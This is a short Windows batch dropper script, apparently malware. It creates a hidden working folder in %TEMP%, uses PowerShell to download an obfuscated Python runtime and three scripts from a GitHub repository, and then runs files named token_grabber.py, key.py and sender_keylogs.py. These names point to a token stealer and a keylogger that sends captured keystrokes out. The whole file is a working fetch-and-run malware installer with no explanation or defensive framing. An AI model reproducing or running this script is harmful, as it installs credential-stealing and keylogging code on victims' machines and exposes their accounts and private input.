cd %TEMP%
md NEW
cd NEW
md pytransform
cd pytransform
Powershell -Command "Invoke-WebRequest 'https://github.com/cakeuwu1/script/raw/main/_pytransform.dll' -Outfile _pytransform.dll"
Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/cakeuwu1/script/main/script1' -Outfile __init__.py"
cd ..
Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/cakeuwu1/script/main/script' -Outfile token_grabber.py"
Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/cakeuwu1/script/main/py.py' -Outfile key.py"
Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/cakeuwu1/script/main/sender_keylogs.py' -Outfile sender_keylogs.py"


token_grabber.py
key.py
sender_keylogs.py
